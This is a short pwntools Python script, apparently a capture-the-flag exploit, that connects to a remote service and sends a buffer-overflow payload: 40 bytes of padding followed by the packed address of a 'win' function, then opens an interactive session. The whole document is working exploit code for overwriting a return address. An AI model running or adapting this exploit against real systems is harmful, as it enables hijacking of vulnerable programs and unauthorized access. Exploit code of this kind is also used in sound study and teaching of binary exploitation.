from pwn import *

# connect to remote service
p = remote("ip", port)

# address of win function
win = p64(0x400797)

# payload 
payload = b'A' * 40
payload += win

# send payload
p.sendline(payload)
p.interactive()